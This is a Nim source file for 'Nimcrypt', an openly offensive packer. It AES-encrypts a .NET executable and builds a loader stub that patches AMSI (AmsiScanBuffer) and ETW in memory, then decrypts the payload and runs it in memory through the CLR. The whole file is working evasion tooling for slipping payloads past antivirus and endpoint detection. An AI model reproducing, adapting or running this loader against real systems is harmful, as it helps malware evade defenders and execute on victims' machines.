#[

    Author: Matthew David, Twitter: @icyguider
    Shoutout: @byt3bl33d3r & @ShitSecure
    License: GPL v3.0

    NIMCRYPT v1.0
]#

import nimcrypto
import nimcrypto/sysrand
import base64
import strformat
import docopt
import os

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc toString(bytes: seq[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

let inspiration = """
                      ___                               
                   .-'   `'.                            
                  /         \                           
                  |         ;                           
                  |         |           ___.--,         
         _.._     |0) ~ (0) |    _.---'`__.-( (_.       
  __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`       
 ( ,.--'`   ',__ /./;   ;, '.__.'`    __                
 _`) )  .---.__.' / |   |\   \__..--""  ""'--.,_        
`---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.' 
      | |  .' _.-' |  |  \  \  '.               `~---`  
       \ \/ .'     \  \   '. '-._)                      
        \/ /        \  \    `=.__`~-.    nimcrypt v 1.0 
   jgs  / /\         `) )    / / `"".`\                 
  , _.-'.'\ \        / /    ( (     / /     public rls  
   `--~`   ) )    .-'.'      '.'.  | (                  
          (/`    ( (`          ) )  '-;                 
           `      '-;         (-'                       
"""

echo inspiration

#Handle arguments

let doc = """
Nimcrypt v 1.0

Usage:
  nimcrypt --file file_to_encrypt [--key <key> --output <output>]
  nimcrypt (-h | --help)
  nimcrypt --version

Options:
  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
  --output filename    Filename for encrypted exe
"""


let args = docopt(doc, version = "Nimcrypt 1.0")

var filename: string = ""
var outfile: string = "testing.exe"
var envkey: string = "TARGETDOMAIN"

if args["--file"]:
  let fname = args["--file"]
  filename = fmt"{fname}"

if args["--key"]:
  let keyname = args["--key"]
  envkey = fmt"{keyname}"

if args["--output"]:
  let outname = args["--output"]
  outfile = fmt"{outname}"


#Read file
let blob = readFile(filename)


var
    data: seq[byte] = toByteSeq(blob)

    ectx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    plaintext = newSeq[byte](len(data))
    enctext = newSeq[byte](len(data))

# Create Random IV
discard randomBytes(addr iv[0], 16)

# We do not need to pad data, `CTR` mode works byte by byte.
copyMem(addr plaintext[0], addr data[0], len(data))

# Expand key to 32 bytes using SHA256 as the KDF
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

ectx.init(key, iv)
ectx.encrypt(plaintext, enctext)
ectx.clear()

let encoded = encode(enctext)
let encodedIV = encode(iv)


let stub1 = """
import winim/lean
import winim/clr except `[]`
import dynlib
import strformat
import os
import nimcrypto
import nimcrypto/sysrand
import base64

when defined amd64:
    echo "[*] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    const etw_patch: array[4, byte] = [byte 0x48, 0x33, 0xC0, 0xC3]
elif defined i386:
    echo "[*] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    const etw_patch: array[5, byte] = [byte 0x33, 0xc0, 0xc2, 0x14, 0x00]

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

proc PatchETW(): bool =
    var
        etw: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false


    etw = loadLib("ntdll")
    if isNil(etw):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = etw.symAddr("RtlInitializeResource") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'RtlInitializeResource'"
        return disabled

    if VirtualProtect(cs, etw_patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr etw_patch, etw_patch.len)
        VirtualProtect(cs, etw_patch.len, op, addr t)
        disabled = true

    return disabled

# Patch AMSI
var success = PatchAmsi()
echo fmt"[*] AMSI disabled: {bool(success)}"

# Patch ETW
success = PatchETW()
echo fmt"[*] ETW disabled: {bool(success)}"

# Decrypt.nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var dctx: CTR[aes256]
"""

let stub2 = fmt"""
var enctext: seq[byte] = toByteSeq(decode("{encoded}"))
var key: array[aes256.sizeKey, byte]
var envkey: string = "{envkey}"
var iv: array[aes256.sizeBlock, byte]
var pp: string = decode("{encodedIV}")
"""

let stub3 = """
# Decode and save IV
copyMem(addr iv[0], addr pp[0], len(pp))

# Ecnrypt Key
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

var dectext = newSeq[byte](len(enctext))

echo "[*] Decrypting packed exe..."

# Decrypt
dctx.init(key, iv)
dctx.decrypt(enctext, dectext)
dctx.clear()

# Load Binary
var assembly = load(dectext)

# Handle args
var cmd: seq[string]
var i = 1
while i <= paramCount():
    cmd.add(paramStr(i))
    inc(i)
var arr = toCLRVariant(cmd, VT_BSTR)
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
"""

let stub = stub1 & stub2 & stub3
writeFile("stub.nim", stub)
discard os.execShellCmd(fmt"nim c -d=debug -d=mingw --embedsrc=on --hints=on --app=console --cpu=amd64 --out={outfile} stub.nim")
let msg = fmt"[!] Encrypted file saved to {outfile}"
echo "\n" & msg